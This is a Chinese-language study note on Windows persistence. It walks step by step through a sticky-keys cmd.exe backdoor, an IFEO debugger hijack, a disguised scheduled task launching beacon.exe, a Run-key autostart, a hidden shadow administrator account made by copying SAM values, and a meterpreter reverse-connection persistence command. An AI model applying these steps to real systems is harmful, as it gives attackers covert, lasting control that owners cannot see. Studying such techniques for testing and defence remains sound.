# Windows权限维持

### 五次粘滞键

1. 需要对sethc.exe有操作权限

   ![image-20220719015509754](../img/Windows权限维持/image-20220719015509754.png)

![image-20220719020412533](../img/Windows权限维持/image-20220719020412533.png)



2. 修改原本粘滞键 sethc.exe ：  renmae sethc.exe sethc.exe.bak

![image-20220719020701149](../img/Windows权限维持/image-20220719020701149.png)



3. 复制cmd.exe 到 sethc.exe  : copy cmd.exe sethc.exe

![image-20220719020838093](../img/Windows权限维持/image-20220719020838093.png)



4. 在登录页面或windows任意页面按五次shift键即可打开cmd窗口

   ![image-20220719021054003](../img/Windows权限维持/image-20220719021054003.png)



### 镜像劫持（修改原本程序的启动路径或软件）IFEO

- 注册表：HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options

1. 打开注册表 HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options

   ![image-20220719022646520](../img/Windows权限维持/image-20220719022646520.png)

   

2. 添加项  (要和想劫持的文件名 一样) sethc.exe

   ![image-20220719022819455](../img/Windows权限维持/image-20220719022819455.png)

   

3. 添加字符串 debugger , 添加值  C:\windows\system32\cmd.exe

   ![image-20220719022947580](../img/Windows权限维持/image-20220719022947580.png)

   

4. 此时粘滞键变为cmd.exe

   ![image-20220719023849460](../img/Windows权限维持/image-20220719023849460.png)



### 计划任务 schtasks  （win7 之前是at）

- 设置计划任务打开cmd：

  - schtasks /create /tn "chrom" /tr cmd.exe /sc minute /mo 1

    ![image-20220719024840259](../img/Windows权限维持/image-20220719024840259.png)

    

- 设置计划任务打开beacon.exe
  - schtasks /create /tn "chrom" /tr beacon.exe /sc minute /mo 1

### 开机自启动

- HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run

  ![image-20220719025412829](../img/Windows权限维持/image-20220719025412829.png)

  

  ![image-20220719025626053](../img/Windows权限维持/image-20220719025626053.png)

### 影子账户 ，隐藏账户

1. 创建隐藏用户

   net user aaa$ 123123 /add

   ![image-20220719025958767](../img/Windows权限维持/image-20220719025958767.png)

   

2. 注册表 （默认看不了，要修改权限）

   ![image-20220719030736203](../img/Windows权限维持/image-20220719030736203.png)

   ![image-20220719030825993](../img/Windows权限维持/image-20220719030825993.png)



3. 复制administrator用户对应的Users项的F值粘贴到 aaa$ 用户对应的Users项的F值

   ![image-20220719031107976](../img/Windows权限维持/image-20220719031107976.png)



4. 导出 Names 中 aaa$ 项，和 Users 中 aaa$ 对应项

   ![image-20220719031315628](../img/Windows权限维持/image-20220719031315628.png)

5. 删除用户net user aaa$ /del![image-20220719031450459](../img/Windows权限维持/image-20220719031450459.png)

   ![image-20220719031615113](../img/Windows权限维持/image-20220719031615113.png)

6. 双击第四步保存的两个reg文件，导入注册表，生成影子账户

   ![image-20220719031738027](../img/Windows权限维持/image-20220719031738027.png)

### **meterpreter 权限维持**

- 自启动	

meterpreter >  run persistence -U -i 10 -p 6666 -r 127.0.0.1

设置开机自启，自动连接 127.0.0.1 的 6666 端口，反弹meterpreter （不稳定且已弃用）





